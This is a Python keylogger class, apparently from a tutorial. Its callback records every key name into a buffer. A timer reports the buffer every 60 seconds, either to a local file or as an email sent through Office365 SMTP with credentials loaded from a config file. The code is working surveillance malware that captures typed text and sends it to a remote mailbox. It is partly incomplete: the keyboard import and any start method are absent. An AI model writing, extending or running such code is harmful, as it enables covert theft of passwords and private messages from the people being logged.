""" This module allows you to take complete control of your keyboard,
 hook global events, register hotkeys, simulate key presses,
 and much more."""
import smtplib

from config import EMAIL_ADDRESS
from config import EMAIL_PASSWORD
# importing keyboard module
from datetime import datetime  # for getting the current time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from threading import Timer

# initializing the variables
SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on


# creating the keylogger
class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # defining callback for the keyboard events
    def callback(self, event):
        # name of the key
        name = event.name
        # if length of key is one, then using uppercase
        if len(name) > 1:
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # adding a new line whenever an enter is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replacing spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    """
    The update_filename() method is simple; we take the recorded date times
     and convert them to a readable string. After that, we construct a filename
      based on these dates, which we'll use for naming our logging files.
    
    The report_to_file() method creates a new file with the name 
    of self.filename, and saves the key logs there.
    """

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:19].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:19].replace(" ", "-").replace(":", "")
        self.filename = f"keylogger_{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    """
    The prepare_mail() method takes the message as a regular Python string and constructs 
    a MIMEMultipart object that helps us make both an HTML and a text version of the mail.

    We then use the prepare_mail() method in sendmail() to send the email. 
    Notice we have used the Office365 SMTP servers to log in to our email account. 
    If you're using another provider, make sure you use their SMTP servers. 

    In the end, we terminate the SMTP connection and print a simple message.
    """
    def prepare_mail(self, message):
        """Utility function to construct a MIMEMultipart from a text
                It creates an HTML version as well as text version
                to be sent as an email"""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"

        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # manages a connection to an SMTP server
        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
        server = smtplib.SMTP(host="smtp.office365.com", port = 587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # terminates the session
        server.quit()

        if verbose:
            print(f"{datetime.now()} -Sent an email to {email} containing : {message}")

    """
    So we are checking if the self.log variable got something (the user pressed something in that period).
    If it is the case, then report it by either saving it to a local file or sending it as an email.

    And then we passed the self.interval (in this tutorial, I've set it to 1 minute or 60 seconds, 
    feel free to adjust it to your needs), and the function self.report() to Timer() class, 
    and then call the start() method after we set it as a daemon thread.

    This way, the method we just implemented sends keystrokes to email or saves them to a local file
    (based on the report_method) and calls itself recursively each self.interval seconds in separate threads.
    """
    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
